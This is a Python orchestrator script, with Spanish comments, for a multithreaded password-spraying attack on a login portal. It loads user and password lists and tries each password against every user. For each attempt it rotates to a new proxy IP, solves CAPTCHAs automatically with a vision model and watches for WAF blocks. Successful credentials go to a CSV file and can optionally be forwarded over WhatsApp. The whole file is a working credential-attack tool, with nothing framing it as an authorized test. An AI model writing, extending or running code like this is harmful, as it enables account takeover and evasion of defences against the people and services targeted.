#!/usr/bin/env python3
"""
para ejecutar: python ejecutar.py
"""

import sys
import os
import csv
import json
import time
import random
import logging
import threading
from pathlib import Path
from datetime import datetime

# Agregar la ruta del proyecto
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

from login_automation import LoginAutomation
from ip_rotator import IPRotator, IPBlacklist
from whatsapp_notifier import WhatsAppNotifier
from captcha_resolver import CaptchaResolver

# Configuración de Rutas
DATA_DIR = PROJECT_DIR / "data"
SCREENSHOT_DIR = PROJECT_DIR / "screenshots"
LOGS_DIR = PROJECT_DIR / "logs"

ARCHIVO_USUARIOS = DATA_DIR / "usuarios.csv"
ARCHIVO_CONTRASENAS = DATA_DIR / "contraseñas.csv"
ARCHIVO_IP = DATA_DIR / "ip.txt"
ARCHIVO_BLACKLIST = DATA_DIR / "ip_blacklist.json"

# Crear directorios necesarios
LOGS_DIR.mkdir(parents=True, exist_ok=True)
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# Configuración del log
log_file = LOGS_DIR / f"ejecutar_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-5s] [%(threadName)-12s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(log_file), encoding="utf-8")
    ]
)
logger = logging.getLogger("Orquestador")


def load_list(fp):
    """Carga líneas de un CSV o archivo de texto."""
    if not fp.exists():
        return []
    vals = []
    with open(fp, "r", encoding="utf-8-sig") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                vals.append(line)
    return vals


def save_to_csv(filepath, procedencia, usuario, contrasena, ip, error_info=""):
    """Guarda un registro en login_correcto o login_incorrecto CSV."""
    file_exists = filepath.exists()
    with open(filepath, "a", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])
        writer.writerow([datetime.now().isoformat(), procedencia, usuario, contrasena, ip, error_info])


def main():
    print("""
============================================================
  LOGIN AUTOMATION — ORQUESTADOR (ejecutar.py)
  Pruebas secuenciales de contraseña por usuario
============================================================
    """)
    start_time = datetime.now()

    # 1. Cargar Archivos
    usuarios = load_list(ARCHIVO_USUARIOS)
    contrasenas = load_list(ARCHIVO_CONTRASENAS)

    if not usuarios or not contrasenas:
        print("❌ Faltan archivos de configuración (usuarios.csv o contraseñas.csv en data/).")
        sys.exit(1)

    print(f"  Total usuarios cargados: {len(usuarios)}")
    print(f"  Total contraseñas cargadas: {len(contrasenas)}")

    # 2. Configuración de procedencia
    print("\nSeleccione la procedencia a trabajar:")
    print("  1. Usuario Interno")
    print("  2. Usuario Externo")
    print("  3. Ambas procedencias (primero Interno, luego Externo)")
    proc_sel = input("Opción (1/2/3, default=3): ").strip()
    
    if proc_sel == "1":
        selected_procedencias = ["interno"]
    elif proc_sel == "2":
        selected_procedencias = ["externo"]
    else:
        selected_procedencias = ["interno", "externo"]

    print(f"  Procedencias a evaluar: {', '.join(p.upper() for p in selected_procedencias)}")

    # 3. Configuración de ejecución
    th = input("\nHilos simultáneos (default=5): ").strip()
    num_threads = int(th) if th.isdigit() and int(th) > 0 else 5
    print(f"  Hilos simultáneos: {num_threads}")

    hl = input("Headless? (s/n, default=s): ").strip().lower()
    headless = hl != "n"

    # 4. Configurar resolvedor de captcha
    captcha_res = CaptchaResolver(method="vlm")

    # 5. Configurar WhatsApp Bridge (Desactivado para la v1)
    notifier = WhatsAppNotifier(
        bridge_port=3456,
        whatsapp_module_dir=str(PROJECT_DIR),
    )
    # Ignorar prompt y establecer a inactivo
    whatsapp_activo = False

    print(f"\n{'='*60}")
    print(f"  INICIANDO BARRIDO DE CREDENCIALES MULTIHILO")
    print(f"  Hilos: {num_threads} | Headless: {headless} | WhatsApp: {'SI' if whatsapp_activo else 'NO'}")
    print(f"{'='*60}\n")

    input("Presiona ENTER para iniciar...")

    # Rutas de guardado
    file_correcto = DATA_DIR / "login_correcto.csv"
    file_incorrecto = DATA_DIR / "login_incorrecto.csv"

    # Estructuras de control para el estado del barrido
    # Set global de usuarios con login_correcto (se descartan de futuras combinaciones)
    successful_users = set()
    success_lock = threading.Lock()
    csv_write_lock = threading.Lock()

    from main import get_proxy_config, generate_session_id
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def run_single_attempt(usuario, contrasena, procedencia):
        # 1. Verificar si ya se logró éxito previamente para este usuario (independiente de procedencia)
        with success_lock:
            if usuario in successful_users:
                return None  # Omitir clave restante al haber completado exitosamente

        session_id = generate_session_id()
        proxy_data = get_proxy_config(session_id=session_id)
        ip_label = proxy_data["ip"]

        proxy_cfg = {
            "server": proxy_data["server"],
            "username": proxy_data["username"],
            "password": proxy_data["password"],
        }

        logger.info(f"🔑 [Probando] {usuario} | Clave: {contrasena} | Proc: {procedencia} | IP: {ip_label}")

        automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
        result = {
            "usuario": usuario,
            "contrasena": contrasena,
            "procedencia": procedencia,
            "ip": ip_label,
            "exito": False,
            "error": "",
            "screenshot": "",
            "waf_blocked": False
        }

        try:
            automation.start_browser(proxy_config=proxy_cfg)
            lr = automation.attempt_login(
                usuario=usuario,
                contraseña=contrasena,
                procedencia=procedencia,
                captcha_resolver=captcha_res.resolve,
            )

            result.update({
                "exito": lr.get("exito", False),
                "error": lr.get("error", ""),
                "screenshot": lr.get("screenshot", ""),
                "waf_blocked": lr.get("waf_blocked", False)
            })

            err_desc = result["error"]

            # Si el XPath de error de credenciales está presente en la web o se expone en el error, NO es correcto
            is_wrong_credentials = (
                "contraseña incorrecta" in err_desc.lower() or 
                "incorrecto" in err_desc.lower() or 
                "claimVerificationServerError" in err_desc or
                "autenticación" in err_desc.lower()
            )

            if result["exito"] and not is_wrong_credentials:
                logger.info(f"✅ [ÉXITO] Acceso confirmado para {usuario} ({procedencia}) con clave {contrasena}")
                with success_lock:
                    successful_users.add(usuario)
                
                # Escribir en login_correcto.csv
                with csv_write_lock:
                    save_to_csv(file_correcto, procedencia, usuario, contrasena, ip_label)

                # Enviar notificación WhatsApp
                if whatsapp_activo:
                    try:
                        notifier.notify_login(
                            procedencia=procedencia,
                            usuario=usuario,
                            contraseña=contrasena,
                            screenshot=result.get("screenshot"),
                            ip=ip_label
                        )
                    except Exception as wa_err:
                        logger.error(f"Error WhatsApp: {wa_err}")

            elif is_wrong_credentials:
                logger.warning(f"❌ [INCORRECTO] {usuario} ({procedencia}) | Clave: {contrasena}")
                with csv_write_lock:
                    save_to_csv(file_incorrecto, procedencia, usuario, contrasena, ip_label, err_desc)
                
                # Enviar notificación WhatsApp para credenciales incorrectas (no se pudo encontrar)
                if whatsapp_activo:
                    try:
                        notifier.notify_error(
                            procedencia=procedencia,
                            usuario=usuario,
                            contraseña=contrasena,
                            error=err_desc,
                            ip=ip_label
                        )
                    except Exception as wa_err:
                        logger.error(f"Error WhatsApp al notificar incorrecto: {wa_err}")
            else:
                if result["waf_blocked"]:
                    logger.warning(f"⚠️ [WAF] Bloqueo detectado en IP {ip_label}")
                else:
                    logger.warning(f"⚠️ [OTRO ERROR] {usuario} -> {err_desc[:60]}")

        except Exception as e:
            logger.error(f"Error en hilo de ejecución: {e}")
        finally:
            try:
                automation.close_browser()
            except:
                pass
        return result

    # Ejecutar secuencialmente por procedencia. Si son ambas, primero se corre Interno completo, y luego Externo.
    for proc in selected_procedencias:
        logger.info(f"🚀 INICIANDO PRUEBAS PARA PROCEDENCIA: {proc.upper()}")
        
        # Generar cola de tareas para esta procedencia específica
        # El orden solicitado es: por cada contraseña, se prueban todos los usuarios
        task_queue = []
        for contrasena in contrasenas:
            for usuario in usuarios:
                task_queue.append((usuario, contrasena, proc))

        # Ejecutar tareas usando ThreadPoolExecutor para hilos simultáneos
        with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix=f"Runner-{proc}") as executor:
            futures = []
            for task in task_queue:
                futures.append(executor.submit(run_single_attempt, task[0], task[1], task[2]))

            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    logger.error(f"Excepción en finalización de tarea: {e}")

    # Detener bridge
    if whatsapp_activo:
        notifier.stop_bridge()

    end_time = datetime.now()
    dur = str(end_time - start_time).split(".")[0]
    print(f"\n============================================================")
    print(f"  PROCESO DE ORQUESTACIÓN COMPLETADO EN {dur}")
    print(f"  Logins Guardados en: {DATA_DIR}")
    print(f"============================================================")


if __name__ == "__main__":
    main()
